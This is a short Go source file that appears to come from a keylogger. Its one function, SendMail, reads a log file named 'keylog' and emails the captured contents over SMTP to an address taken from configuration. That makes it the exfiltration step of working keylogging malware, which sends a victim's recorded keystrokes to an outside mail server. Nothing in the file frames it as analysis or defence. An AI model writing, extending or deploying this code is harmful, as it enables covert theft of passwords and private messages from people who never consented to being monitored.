package main

import (
	"log"

	"gopkg.in/gomail.v2"
)

func SendMail() {
	dialer := gomail.NewDialer(conf.GetString("host_mail"),
		conf.GetInt("port_mail"),
		conf.GetString("user_mail"),
		conf.GetString("pass_mail"))
	message := gomail.NewMessage()
	message.SetHeader("From", conf.GetString("from_mail"))
	message.SetHeader("To", conf.GetString("to_mail"))
	message.SetHeader("Subject", conf.GetString("subject_mail"))
	message.SetBody("text", ReadLogFile("keylog"))
	err := dialer.DialAndSend(message)
	if err != nil {
		log.Println(err)
	}
	log.Println("Send mail...")
	close(sendMailDone)
}
